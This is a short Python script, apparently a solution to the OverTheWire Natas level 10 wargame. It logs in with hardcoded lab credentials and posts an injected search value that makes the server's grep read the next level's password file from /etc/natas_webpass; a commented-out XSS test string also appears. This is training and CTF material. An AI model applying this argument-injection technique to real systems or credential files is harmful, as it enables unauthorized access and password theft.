import requests
from requests.auth import HTTPBasicAuth
import re


url="http://natas10.natas.labs.overthewire.org"

session = requests.Session()

username="natas10"
password="nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

# payload = "<script>alert(0)</script>"
payload = "u /etc/natas_webpass/natas11"

data = {
	"needle": payload,
	"submit":"Search"
}

req = session.post(url, auth=HTTPBasicAuth(username, password), data = data)

print(req.text)
